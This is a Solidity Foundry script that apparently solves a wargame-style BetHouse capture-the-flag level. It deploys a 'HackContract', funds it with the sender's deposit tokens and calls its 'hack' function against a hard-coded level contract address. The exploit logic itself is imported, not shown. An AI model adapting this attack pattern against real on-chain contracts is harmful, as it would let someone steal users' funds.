// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;
import {Script, console} from "forge-std/Script.sol";
import {BetHouse, Pool, HackContract} from "../src/BetHouse.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BetHouseScript is Script {
    function run() external {
        vm.startBroadcast();
        HackContract hc = new HackContract();

        address levelContractAddress = 0x92A4BfC1A4b9292e1FDabeBBFaC3DdD7da98D608;
        BetHouse bh = BetHouse(levelContractAddress);
        Pool p = Pool(bh.pool());
        ERC20 depositeToken = ERC20(p.depositToken());
        depositeToken.transfer(address(hc), depositeToken.balanceOf(msg.sender));

        hc.hack{value:0.001 ether}();

        vm.stopBroadcast();
    }
}